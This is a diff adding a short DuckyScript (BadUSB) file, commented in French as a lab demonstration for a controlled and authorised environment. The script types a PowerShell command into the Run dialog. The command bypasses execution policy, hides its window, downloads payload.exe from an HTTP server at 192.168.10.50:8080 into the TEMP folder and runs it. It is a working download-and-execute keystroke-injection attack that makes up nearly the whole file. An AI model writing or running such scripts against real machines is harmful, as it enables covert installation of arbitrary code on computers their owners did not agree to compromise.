@@ -1,0 +1,10 @@
+REM BadUSB — script de démonstration lab
+REM Objectif: télécharger un payload légitime depuis un serveur HTTP local
+REM Ne prétend pas à une détection avancée de Defender; il vise un environnement contrôlé et autorisé.
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Write-Host 'Démonstration BadUSB'; Start-Sleep -Seconds 2; $url = 'http://192.168.10.50:8080/payload.exe'; $dest = Join-Path $env:TEMP 'payload_demo.exe'; (New-Object System.Net.WebClient).DownloadFile($url, $dest); Start-Process $dest"
+ENTER
+DELAY 2000
+CTRL s
